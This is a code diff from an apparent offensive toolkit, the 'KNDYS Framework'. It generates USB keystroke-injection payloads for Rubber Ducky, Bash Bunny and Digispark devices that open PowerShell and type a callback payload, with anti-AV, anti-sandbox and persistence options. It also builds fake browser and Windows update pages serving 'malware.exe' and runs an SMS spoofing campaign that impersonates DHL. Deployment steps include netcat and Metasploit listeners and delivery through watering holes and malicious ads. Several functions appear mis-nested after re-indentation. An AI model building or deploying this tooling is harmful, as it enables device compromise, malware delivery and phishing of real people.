+                script += f"""CTRL-ALT t
+    DELAY 500
+    """
+                for line in payload.split('\n'):
+                    if line.strip():
+                        script += f"STRING {line}\n"
+                        script += f"DELAY {keystroke_delay}\n"
+                        script += "ENTER\n"
+            
+            script += "\nDELAY 500\nSTRING exit\nENTER\n"
+            return script
+        
+        elif device_format == 'bash_bunny_payload':
+            # Bash Bunny payload format
+            return f"""#!/bin/bash
+    # Bash Bunny Payload - {config['campaign_name']}
+    LED R G B
+    ATTACKMODE HID STORAGE
+    LED R G
+    Q GUI r
+    Q DELAY 500
+    Q STRING powershell
+    Q ENTER
+    Q DELAY 1000
+    Q STRING {payload}
+    Q ENTER
+    LED G
+    """
+        
+        elif device_format == 'arduino_sketch':
+            # Arduino/Digispark format
+            return f"""#include "DigiKeyboard.h"
+    void setup() {{
+      DigiKeyboard.delay(1000);
+      DigiKeyboard.sendKeyStroke(0);
+      DigiKeyboard.delay(500);
+      
+      // Open Run dialog
+      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+      DigiKeyboard.delay(500);
+      
+      // Type command
+      DigiKeyboard.print("powershell");
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(1000);
+      
+      // Execute payload
+      DigiKeyboard.print("{payload.replace('"', '\\"')}");
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    }}
+    
+    void loop() {{}}
+    """
+        
+        else:
+            return payload
+    
+    
+    def _batch_generate_payloads(config):
+        """Generate multiple payloads in batch mode"""
+        from colorama import Fore, Style
+        import time
+        
+        batch_count = config['batch_count']
+        results = []
+        
+        print(f"{Fore.CYAN}Generating {batch_count} payloads...{Style.RESET_ALL}\n")
+        
+        for i in range(1, batch_count + 1):
+            # Generate unique filename
+            timestamp = int(time.time())
+            filename = config['naming_pattern'].format(
+                campaign=config['campaign_name'],
+                index=i,
+                timestamp=timestamp
+            ) + '.txt'
+            
+            # Update config for this payload
+            batch_config = config.copy()
+            batch_config['output'] = filename
+            
+            # Add uniqueness if requested
+            if config['unique_payloads']:
+                batch_config['callback_interval'] = config['callback_interval'] + (i % 10)
+                batch_config['callback_jitter'] = config['callback_jitter'] + (i % 20)
+            
+            # Generate payload
+            print(f"{Fore.CYAN}→ [{i}/{batch_count}] Generating {filename}...{Style.RESET_ALL}", end='')
+            result = _generate_single_payload(batch_config)
+            
+            if result['success']:
+                print(f" {Fore.GREEN}✓{Style.RESET_ALL}")
+                results.append(result)
+            else:
+                print(f" {Fore.RED}✗ {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
+                results.append(result)
+            
+            time.sleep(0.1)  # Small delay between generations
+        
+        return results
+    
+    
+    def _log_payload_to_db(config, file_path, payload_hash):
+        """Log payload generation to database"""
+        import sqlite3
+        
+        db_path = os.path.join(config['output_dir'], config['db_file'])
+        try:
+            conn = sqlite3.connect(db_path)
+            cursor = conn.cursor()
+            
+            # Get campaign ID
+            cursor.execute("SELECT id FROM campaigns WHERE name = ? ORDER BY id DESC LIMIT 1", 
+                          (config['campaign_name'],))
+            campaign_id = cursor.fetchone()[0]
+            
+            # Insert payload record
+            cursor.execute('''
+                INSERT INTO payloads (campaign_id, payload_hash, file_path, device_type, 
+                                     target_os, payload_type, encoding, obfuscation_level)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (campaign_id, payload_hash, file_path, config['device_type'], 
+                  config['target_os'], config['payload_type'], config['payload_encoding'],
+                  config['obfuscation_level']))
+            
+            # Update campaign totals
+            cursor.execute('''
+                UPDATE campaigns SET total_payloads = total_payloads + 1 WHERE id = ?
+            ''', (campaign_id,))
+            
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            pass  # Silent fail for analytics
+    
+    
+    def _display_usb_results(results, config, batch=False):
+        """Display generation results"""
+        from colorama import Fore, Style
+        
+        print(f"\n{Fore.CYAN}{'=' * 70}")
+        print(f"  GENERATION RESULTS")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+        
+        if batch:
+            successful = sum(1 for r in results if r['success'])
+            failed = len(results) - successful
+            
+            print(f"{Fore.YELLOW}Batch Statistics:{Style.RESET_ALL}")
+            print(f"  • Total Payloads:  {Fore.WHITE}{len(results)}{Style.RESET_ALL}")
+            print(f"  • Successful:      {Fore.GREEN}{successful}{Style.RESET_ALL}")
+            print(f"  • Failed:          {Fore.RED}{failed}{Style.RESET_ALL}")
+            print(f"  • Success Rate:    {Fore.CYAN}{(successful/len(results)*100):.1f}%{Style.RESET_ALL}")
+            
+            if failed > 0:
+                print(f"\n{Fore.RED}Failed Payloads:{Style.RESET_ALL}")
+                for i, result in enumerate(results):
+                    if not result['success']:
+                        print(f"  • Payload #{i+1}: {result.get('error', 'Unknown error')}")
+        else:
+            result = results[0]
+            if result['success']:
+                print(f"{Fore.GREEN}✓ Payload generated successfully{Style.RESET_ALL}\n")
+                print(f"{Fore.YELLOW}Details:{Style.RESET_ALL}")
+                print(f"  • File:            {Fore.WHITE}{result['file']}{Style.RESET_ALL}")
+                print(f"  • Hash (SHA256):   {Fore.CYAN}{result['hash'][:32]}...{Style.RESET_ALL}")
+                print(f"  • Size:            {Fore.WHITE}{result['size']} bytes{Style.RESET_ALL}")
+                print(f"  • Lines:           {Fore.WHITE}{result['lines']}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}✗ Payload generation failed{Style.RESET_ALL}")
+                print(f"{Fore.RED}Error: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.CYAN}Compatible Devices:{Style.RESET_ALL}")
+        devices = [
+            "USB Rubber Ducky",
+            "Bash Bunny",
+            "Teensy USB Development Board",
+            "Digispark ATtiny85",
+            "Malduino",
+            "WHID (WiFi HID Injector)",
+            "P4wnP1 A.L.O.A",
+            "Cactus WHID"
+        ]
+        for device in devices:
+            print(f"  • {device}")
+        
+        print(f"\n{Fore.BLUE}ℹ  Next Steps:{Style.RESET_ALL}")
+        print(f"  1. Flash payload to USB device")
+        print(f"  2. Set up listener: {Fore.CYAN}nc -lvp {config['lport']}{Style.RESET_ALL}")
+        print(f"  3. Deploy device to target")
+        print(f"  4. Wait for callback")
+    
+    
+    def _generate_readme(config, payload_path):
+        """Generate README file with instructions"""
+        readme_content = f"""# USB Payload - {config['campaign_name']}
+    
+    ## Configuration
+    - **Payload Type:** {config['payload_type']}
+    - **Target OS:** {config['target_os']}
+    - **Device Type:** {config['device_type']}
+    - **Callback:** {config['lhost']}:{config['lport']}
+    
+    ## Deployment Instructions
+    
+    ### 1. Flash Payload to Device
+    ```bash
+    # For Rubber Ducky
+    # Copy {os.path.basename(payload_path)} to SD card as inject.bin
+    
+    # For Teensy
+    # Use Teensy Loader to upload sketch
+    
+    # For Digispark
+    # Use Arduino IDE to upload sketch
+    ```
+    
+    ### 2. Set Up Listener
+    ```bash
+    # Netcat listener
+    nc -lvp {config['lport']}
+    
+    # Metasploit handler
+    use exploit/multi/handler
+    set payload {config['payload_type']}
+    set LHOST {config['lhost']}
+    set LPORT {config['lport']}
+    exploit -j
+    ```
+    
+    ### 3. Deploy Device
+    - Insert USB device into target system
+    - Device will automatically execute payload
+    - Wait for callback on listener
+    
+    ## Security Considerations
+    - Use only in authorized penetration testing
+    - Ensure proper legal authorization
+    - Document all activities
+    - Remove payload after testing
+    
+    ## Features Enabled
+    - Anti-AV: {config['anti_av']}
+    - Anti-Sandbox: {config['anti_sandbox']}
+    - Fileless Execution: {config['fileless']}
+    - Persistence: {config['persistence']}
+    - Obfuscation: {config['obfuscation_level']}
+    
+    Generated by KNDYS Framework
+    """
+        
+        readme_path = payload_path.replace('.txt', '_README.md')
+        with open(readme_path, 'w') as f:
+            f.write(readme_content)
+    
+    
+    def _generate_usb_reports(config):
+        """Generate reports in various formats"""
+        from colorama import Fore, Style
+        
+        formats = config['report_format']
+        if formats == 'all':
+            formats = ['txt', 'json', 'html']
+        else:
+            formats = [formats]
+        
+        for fmt in formats:
+            report_file = os.path.join(config['output_dir'], f"{config['campaign_name']}_report.{fmt}")
+            
+            if fmt == 'txt':
+                _generate_txt_report(config, report_file)
+            elif fmt == 'json':
+                _generate_json_report(config, report_file)
+            elif fmt == 'html':
+                _generate_html_report(config, report_file)
+            
+            print(f"{Fore.GREEN}✓ Generated {fmt.upper()} report: {report_file}{Style.RESET_ALL}")
+    
+    
+    def _generate_txt_report(config, output_file):
+        """Generate text format report"""
+        content = f"""USB PAYLOAD CAMPAIGN REPORT
+    {'=' * 70}
+    
+    Campaign: {config['campaign_name']}
+    Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
+    
+    CONFIGURATION
+    -------------
+    Payload Type:        {config['payload_type']}
+    Target OS:           {config['target_os']}
+    Device Type:         {config['device_type']}
+    Device Format:       {config['device_format']}
+    
+    NETWORK
+    -------
+    Callback Host:       {config['lhost']}:{config['lport']}
+    Protocol:            {config['callback_protocol']}
+    Interval:            {config['callback_interval']}s
+    Jitter:              {config['callback_jitter']}%
+    
+    SECURITY
+    --------
+    Encoding:            {config['payload_encoding']}
+    Obfuscation:         {config['obfuscation_level']}
+    Anti-AV:             {config['anti_av']}
+    Anti-Sandbox:        {config['anti_sandbox']}
+    Fileless:            {config['fileless']}
+    
+    OUTPUT
+    ------
+    Directory:           {config['output_dir']}
+    Batch Mode:          {config['batch_mode']}
+    """
+        
+        with open(output_file, 'w') as f:
+            f.write(content)
+    
+    
+    def _generate_json_report(config, output_file):
+        """Generate JSON format report"""
+        import json
+        import time
+        
+        report = {
+            'campaign': config['campaign_name'],
+            'timestamp': time.time(),
+            'configuration': {
+                'payload_type': config['payload_type'],
+                'target_os': config['target_os'],
+                'device_type': config['device_type'],
+                'device_format': config['device_format']
             },
-            'firefox': {
-                'title': 'Firefox Update Available',
-                'message': 'Firefox must be updated to continue',
-                'button': 'Update Firefox'
+            'network': {
+                'lhost': config['lhost'],
+                'lport': config['lport'],
+                'protocol': config['callback_protocol'],
+                'interval': config['callback_interval'],
+                'jitter': config['callback_jitter']
             },
-            'flash': {
-                'title': 'Flash Player Update',
-                'message': 'Flash Player is out of date',
-                'button': 'Update Flash Player'
+            'security': {
+                'encoding': config['payload_encoding'],
+                'obfuscation': config['obfuscation_level'],
+                'anti_av': config['anti_av'],
+                'anti_sandbox': config['anti_sandbox'],
+                'fileless': config['fileless']
             },
-            'windows': {
-                'title': 'Windows Security Update',
-                'message': 'Critical security update required',
-                'button': 'Install Update'
+            'batch': {
+                'enabled': config['batch_mode'],
+                'count': config['batch_count'] if config['batch_mode'] else 1
             }
         }
         
-        template = templates.get(software, templates['chrome'])
-        
-        html_content = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>{template['title']}</title>
-    <style>
-        body {{
-            font-family: Arial, sans-serif;
-            background: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }}
-        .update-box {{
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-        }}
-        .icon {{
-            font-size: 64px;
-            margin-bottom: 20px;
-        }}
-        h1 {{
-            color: #333;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }}
-        p {{
-            color: #666;
-            margin-bottom: 30px;
-        }}
-        .update-btn {{
-            background: #4285f4;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-        }}
-        .update-btn:hover {{
-            background: #357ae8;
-        }}
-    </style>
-</head>
-<body>
-    <div class="update-box">
-        <div class="icon">️</div>
-        <h1>{template['title']}</h1>
-        <p>{template['message']}</p>
-        <a href="/{payload}" download>
-            <button class="update-btn">{template['button']}</button>
-        </a>
-    </div>
-</body>
-</html>"""
-        
-        output_dir = f"fake_update_{software}"
-        os.makedirs(output_dir, exist_ok=True)
-        
-        with open(f"{output_dir}/index.html", 'w') as f:
-            f.write(html_content)
-        
-        print(f"{Fore.GREEN} Fake update page generated!{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW} Setup:{Style.RESET_ALL}")
-        print(f" 1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
-        print(f" 2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
-        print(f" 3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.BLUE}ℹ Delivery methods:{Style.RESET_ALL}")
-        print(f" • Watering hole attacks")
-        print(f" • Compromised websites")
-        print(f" • Malicious ads")
-        print(f" • Email campaigns")
+        with open(output_file, 'w') as f:
+            json.dump(report, f, indent=2)
     
-    def run_sms_spoofing(self):
-        """
-        ╔══════════════════════════════════════════════════════════════════╗
-        ║          SMS SPOOFING - Enterprise Campaign Platform             ║
-        ║                                                                  ║
-        ║  • Multi-Provider Support  • Advanced Analytics & Tracking      ║
-        ║  • 50+ Templates          • Intelligent Rate Limiting            ║
-        ║  • Scheduling & Automation • Compliance & Security               ║
-        ║  • Real-time Dashboard     • A/B Testing & Optimization          ║
-        ╚══════════════════════════════════════════════════════════════════╝
-        """
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"  SMS SPOOFING - Enterprise Campaign Platform")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+    
+    def _generate_html_report(config, output_file):
+        """Generate HTML format report"""
+        html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>USB Payload Report - {config['campaign_name']}</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
+            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+            h1 {{ color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }}
+            h2 {{ color: #555; margin-top: 30px; }}
+            .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }}
+            .info-card {{ background: #f9f9f9; padding: 15px; border-radius: 5px; border-left: 4px solid #4CAF50; }}
+            .label {{ font-weight: bold; color: #666; }}
+            .value {{ color: #333; margin-top: 5px; }}
+            .success {{ color: #4CAF50; }}
+            .warning {{ color: #FF9800; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>USB Payload Campaign Report</h1>
+            <p><strong>Campaign:</strong> {config['campaign_name']}</p>
+            <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+            
+            <h2>Configuration</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="label">Payload Type</div>
+                    <div class="value">{config['payload_type']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Target OS</div>
+                    <div class="value">{config['target_os']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Device Type</div>
+                    <div class="value">{config['device_type']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Device Format</div>
+                    <div class="value">{config['device_format']}</div>
+                </div>
+            </div>
+            
+            <h2>Network Configuration</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="label">Callback Address</div>
+                    <div class="value">{config['lhost']}:{config['lport']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Protocol</div>
+                    <div class="value">{config['callback_protocol']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Interval</div>
+                    <div class="value">{config['callback_interval']} seconds</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Jitter</div>
+                    <div class="value">{config['callback_jitter']}%</div>
+                </div>
+            </div>
+            
+            <h2>Security & Evasion</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="label">Encoding</div>
+                    <div class="value">{config['payload_encoding']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Obfuscation Level</div>
+                    <div class="value">{config['obfuscation_level']}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Anti-AV</div>
+                    <div class="value {'success' if config['anti_av'] else 'warning'}">{'Enabled' if config['anti_av'] else 'Disabled'}</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Fileless Execution</div>
+                    <div class="value {'success' if config['fileless'] else 'warning'}">{'Enabled' if config['fileless'] else 'Disabled'}</div>
+                </div>
+            </div>
+        </div>
+    </body>
+    </html>"""
         
-        # Load and validate configuration
-        config = self._load_sms_config()
-        if not config:
-            print(f"{Fore.RED}✗ ERROR: Configuration loading failed{Style.RESET_ALL}")
-            return
+        with open(output_file, 'w') as f:
+            f.write(html)
+    
+    
+    def _cleanup_temp_files(config):
+        """Cleanup temporary files if needed"""
+        # Placeholder for cleanup logic
+        pass
+    
+        def run_fake_update(self):
+            """Fake software update page generator"""
+            software = self.module_options.get('software', 'chrome')
+            payload = self.module_options.get('payload', 'update.exe')
+            port = self.module_options.get('port', '8080')
+            
+            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}║ FAKE UPDATE GENERATOR ║{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+            
+            templates = {
+                'chrome': {
+                    'title': 'Chrome Update Required',
+                    'message': 'A new version of Chrome is available',
+                    'button': 'Update Chrome'
+                },
+                'firefox': {
+                    'title': 'Firefox Update Available',
+                    'message': 'Firefox must be updated to continue',
+                    'button': 'Update Firefox'
+                },
+                'flash': {
+                    'title': 'Flash Player Update',
+                    'message': 'Flash Player is out of date',
+                    'button': 'Update Flash Player'
+                },
+                'windows': {
+                    'title': 'Windows Security Update',
+                    'message': 'Critical security update required',
+                    'button': 'Install Update'
+                }
+            }
+            
+            template = templates.get(software, templates['chrome'])
+            
+            html_content = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>{template['title']}</title>
+        <style>
+            body {{
+                font-family: Arial, sans-serif;
+                background: #f0f0f0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+            }}
+            .update-box {{
+                background: white;
+                padding: 40px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                text-align: center;
+                max-width: 400px;
+            }}
+            .icon {{
+                font-size: 64px;
+                margin-bottom: 20px;
+            }}
+            h1 {{
+                color: #333;
+                font-size: 24px;
+                margin-bottom: 10px;
+            }}
+            p {{
+                color: #666;
+                margin-bottom: 30px;
+            }}
+            .update-btn {{
+                background: #4285f4;
+                color: white;
+                border: none;
+                padding: 12px 30px;
+                font-size: 16px;
+                border-radius: 4px;
+                cursor: pointer;
+            }}
+            .update-btn:hover {{
+                background: #357ae8;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="update-box">
+            <div class="icon">️</div>
+            <h1>{template['title']}</h1>
+            <p>{template['message']}</p>
+            <a href="/{payload}" download>
+                <button class="update-btn">{template['button']}</button>
+            </a>
+        </div>
+    </body>
+    </html>"""
+            
+            output_dir = f"fake_update_{software}"
+            os.makedirs(output_dir, exist_ok=True)
+            
+            with open(f"{output_dir}/index.html", 'w') as f:
+                f.write(html_content)
+            
+            print(f"{Fore.GREEN} Fake update page generated!{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW} Setup:{Style.RESET_ALL}")
+            print(f" 1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
+            print(f" 2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
+            print(f" 3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.BLUE}ℹ Delivery methods:{Style.RESET_ALL}")
+            print(f" • Watering hole attacks")
+            print(f" • Compromised websites")
+            print(f" • Malicious ads")
+            print(f" • Email campaigns")
         
-        # Display configuration
-        self._display_sms_config(config)
-        
-        # Initialize database for tracking
-        db_conn = self._initialize_sms_database(config)
-        if not db_conn:
-            print(f"{Fore.YELLOW}⚠ WARNING: Database initialization failed - continuing without analytics{Style.RESET_ALL}")
-        
-        # Validate provider credentials
-        provider_valid = self._validate_sms_provider(config)
-        if not provider_valid:
-            print(f"{Fore.RED}✗ ERROR: SMS provider validation failed{Style.RESET_ALL}")
+        def run_sms_spoofing(self):
+            """
+            ╔══════════════════════════════════════════════════════════════════╗
+            ║          SMS SPOOFING - Enterprise Campaign Platform             ║
+            ║                                                                  ║
+            ║  • Multi-Provider Support  • Advanced Analytics & Tracking      ║
+            ║  • 50+ Templates          • Intelligent Rate Limiting            ║
+            ║  • Scheduling & Automation • Compliance & Security               ║
+            ║  • Real-time Dashboard     • A/B Testing & Optimization          ║
+            ╚══════════════════════════════════════════════════════════════════╝
+            """
+            print(f"\n{Fore.CYAN}{'=' * 70}")
+            print(f"  SMS SPOOFING - Enterprise Campaign Platform")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
+            
+            # Load and validate configuration
+            config = self._load_sms_config()
+            if not config:
+                print(f"{Fore.RED}✗ ERROR: Configuration loading failed{Style.RESET_ALL}")
+                return
+            
+            # Display configuration
+            self._display_sms_config(config)
+            
+            # Initialize database for tracking
+            db_conn = self._initialize_sms_database(config)
+            if not db_conn:
+                print(f"{Fore.YELLOW}⚠ WARNING: Database initialization failed - continuing without analytics{Style.RESET_ALL}")
+            
+            # Validate provider credentials
+            provider_valid = self._validate_sms_provider(config)
+            if not provider_valid:
+                print(f"{Fore.RED}✗ ERROR: SMS provider validation failed{Style.RESET_ALL}")
+                if db_conn:
+                    db_conn.close()
+                return
+            
+            # Load and validate targets
+            targets = self._load_sms_targets(config)
+            if not targets:
+                print(f"{Fore.RED}✗ ERROR: No valid targets loaded{Style.RESET_ALL}")
+                if db_conn:
+                    db_conn.close()
+                return
+            
+            print(f"{Fore.GREEN}✓ Loaded {len(targets)} target(s){Style.RESET_ALL}")
+            
+            # Check dry run mode
+            if config.get('dry_run'):
+                print(f"\n{Fore.YELLOW}⚠ DRY RUN MODE - No messages will be sent{Style.RESET_ALL}")
+                self._dry_run_simulation(config, targets, db_conn)
+                if db_conn:
+                    db_conn.close()
+                return
+            
+            # Check scheduling
+            if config.get('schedule') != 'now':
+                print(f"\n{Fore.CYAN}⏰ Campaign scheduled for: {config['schedule']}{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Use scheduler to execute at specified time{Style.RESET_ALL}\n")
+                self._schedule_sms_campaign(config, targets, db_conn)
+                return
+            
+            # Execute campaign
+            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
+            print(f"║                    EXECUTING CAMPAIGN                            ║")
+            print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+            
+            results = self._execute_sms_campaign(config, targets, db_conn)
+            
+            # Display results
+            self._display_sms_results(results, config)
+            
+            # Generate reports
+            if config.get('generate_dashboard'):
+                report_files = self._generate_sms_reports(results, config, db_conn)
+                if report_files:
+                    print(f"\n{Fore.GREEN}✓ Reports generated:{Style.RESET_ALL}")
+                    for report_type, filepath in report_files.items():
+                        print(f"  • {report_type.upper()}: {filepath}")
+            
+            # Cleanup
             if db_conn:
                 db_conn.close()
-            return
-        
-        # Load and validate targets
-        targets = self._load_sms_targets(config)
-        if not targets:
-            print(f"{Fore.RED}✗ ERROR: No valid targets loaded{Style.RESET_ALL}")
-            if db_conn:
-                db_conn.close()
-            return
-        
-        print(f"{Fore.GREEN}✓ Loaded {len(targets)} target(s){Style.RESET_ALL}")
-        
-        # Check dry run mode
-        if config.get('dry_run'):
-            print(f"\n{Fore.YELLOW}⚠ DRY RUN MODE - No messages will be sent{Style.RESET_ALL}")
-            self._dry_run_simulation(config, targets, db_conn)
-            if db_conn:
-                db_conn.close()
-            return
-        
-        # Check scheduling
-        if config.get('schedule') != 'now':
-            print(f"\n{Fore.CYAN}⏰ Campaign scheduled for: {config['schedule']}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ Use scheduler to execute at specified time{Style.RESET_ALL}\n")
-            self._schedule_sms_campaign(config, targets, db_conn)
-            return
-        
-        # Execute campaign
-        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
-        print(f"║                    EXECUTING CAMPAIGN                            ║")
-        print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-        
-        results = self._execute_sms_campaign(config, targets, db_conn)
-        
-        # Display results
-        self._display_sms_results(results, config)
-        
-        # Generate reports
-        if config.get('generate_dashboard'):
-            report_files = self._generate_sms_reports(results, config, db_conn)
-            if report_files:
-                print(f"\n{Fore.GREEN}✓ Reports generated:{Style.RESET_ALL}")
-                for report_type, filepath in report_files.items():
-                    print(f"  • {report_type.upper()}: {filepath}")
-        
-        # Cleanup
-        if db_conn:
-            db_conn.close()
-        
-        print(f"\n{Fore.GREEN}✓ Campaign completed successfully{Style.RESET_ALL}\n")
-
-    def _load_sms_config(self):
-        """Load and validate SMS spoofing configuration with defaults"""
-        config = {}
-        
-        # Provider Configuration
-        config['provider'] = self.module_options.get('provider', 'twilio').lower()
-        config['twilio_sid'] = self.module_options.get('twilio_sid', '')
-        config['twilio_token'] = self.module_options.get('twilio_token', '')
-        config['twilio_number'] = self.module_options.get('twilio_number', '')
-        config['vonage_api_key'] = self.module_options.get('vonage_api_key', '')
-        config['vonage_api_secret'] = self.module_options.get('vonage_api_secret', '')
-        config['vonage_number'] = self.module_options.get('vonage_number', '')
-        config['aws_access_key'] = self.module_options.get('aws_access_key', '')
-        config['aws_secret_key'] = self.module_options.get('aws_secret_key', '')
-        config['aws_region'] = self.module_options.get('aws_region', 'us-east-1')
-        
-        # Message Configuration
-        config['message'] = self.module_options.get('message', 'Your package is ready. Track: {link}')
-        config['sender'] = self.module_options.get('sender', 'DHL')
-        config['sender_number'] = self.module_options.get('sender_number', '')
-        config['message_type'] = self.module_options.get('message_type', 'promotional')
-        config['encoding'] = self.module_options.get('encoding', 'auto')
-        config['flash_sms'] = self.module_options.get('flash_sms', 'false').lower() == 'true'
-        config['validity_period'] = int(self.module_options.get('validity_period', '72'))
-        
-        # Campaign Configuration
-        config['campaign_name'] = self.module_options.get('campaign_name', 'sms_campaign')
-        config['targets'] = self.module_options.get('targets', 'phones.txt')
-        config['max_targets'] = int(self.module_options.get('max_targets', '1000'))
-        config['batch_size'] = int(self.module_options.get('batch_size', '50'))
-        config['delay'] = float(self.module_options.get('delay', '2'))
-        config['batch_delay'] = int(self.module_options.get('batch_delay', '60'))
-        config['randomize_delay'] = self.module_options.get('randomize_delay', 'true').lower() == 'true'
-        config['retry_failed'] = self.module_options.get('retry_failed', 'true').lower() == 'true'
-        config['max_retries'] = int(self.module_options.get('max_retries', '3'))
-        
-        # Personalization & Templates
-        config['template'] = self.module_options.get('template', 'custom')
-        config['link'] = self.module_options.get('link', 'http://track.example.com/123')
-        config['link_shortener'] = self.module_options.get('link_shortener', 'none')
-        config['bitly_token'] = self.module_options.get('bitly_token', '')
-        config['personalize'] = self.module_options.get('personalize', 'true').lower() == 'true'
-        config['randomize_content'] = self.module_options.get('randomize_content', 'false').lower() == 'true'
-        
-        # Scheduling
-        config['schedule'] = self.module_options.get('schedule', 'now')
-        config['timezone'] = self.module_options.get('timezone', 'UTC')
-        config['business_hours_only'] = self.module_options.get('business_hours_only', 'false').lower() == 'true'
-        config['respect_dnd'] = self.module_options.get('respect_dnd', 'true').lower() == 'true'
-        
-        # Tracking & Analytics
-        config['track_delivery'] = self.module_options.get('track_delivery', 'true').lower() == 'true'
-        config['track_clicks'] = self.module_options.get('track_clicks', 'true').lower() == 'true'
-        config['track_replies'] = self.module_options.get('track_replies', 'false').lower() == 'true'
-        config['webhook_url'] = self.module_options.get('webhook_url', '')
-        config['db_file'] = self.module_options.get('db_file', 'sms_campaign.db')
-        config['log_file'] = self.module_options.get('log_file', 'sms_campaign.log')
-        
-        # Rate Limiting & Throttling
-        config['rate_limit'] = int(self.module_options.get('rate_limit', '10'))
-        config['daily_limit'] = int(self.module_options.get('daily_limit', '1000'))
-        config['per_number_limit'] = int(self.module_options.get('per_number_limit', '5'))
-        config['adaptive_throttle'] = self.module_options.get('adaptive_throttle', 'true').lower() == 'true'
-        
-        # Security & Compliance
-        config['require_opt_in'] = self.module_options.get('require_opt_in', 'true').lower() == 'true'
-        config['opt_in_file'] = self.module_options.get('opt_in_file', 'opt_ins.txt')
-        config['blacklist_file'] = self.module_options.get('blacklist_file', 'blacklist.txt')
-        config['dry_run'] = self.module_options.get('dry_run', 'false').lower() == 'true'
-        config['audit_log'] = self.module_options.get('audit_log', 'true').lower() == 'true'
-        config['encrypt_db'] = self.module_options.get('encrypt_db', 'false').lower() == 'true'
-        config['gdpr_compliant'] = self.module_options.get('gdpr_compliant', 'true').lower() == 'true'
-        
-        # Output & Reporting
-        config['output_format'] = self.module_options.get('output_format', 'all')
-        config['report_file'] = self.module_options.get('report_file', 'sms_report')
-        config['real_time_stats'] = self.module_options.get('real_time_stats', 'true').lower() == 'true'
-        config['export_failed'] = self.module_options.get('export_failed', 'true').lower() == 'true'
-        config['generate_dashboard'] = self.module_options.get('generate_dashboard', 'true').lower() == 'true'
-        
-        # Advanced Features
-        config['multi_phase'] = self.module_options.get('multi_phase', 'false').lower() == 'true'
-        config['phase_delay'] = int(self.module_options.get('phase_delay', '24'))
-        config['a_b_testing'] = self.module_options.get('a_b_testing', 'false').lower() == 'true'
-        config['sentiment_analysis'] = self.module_options.get('sentiment_analysis', 'false').lower() == 'true'
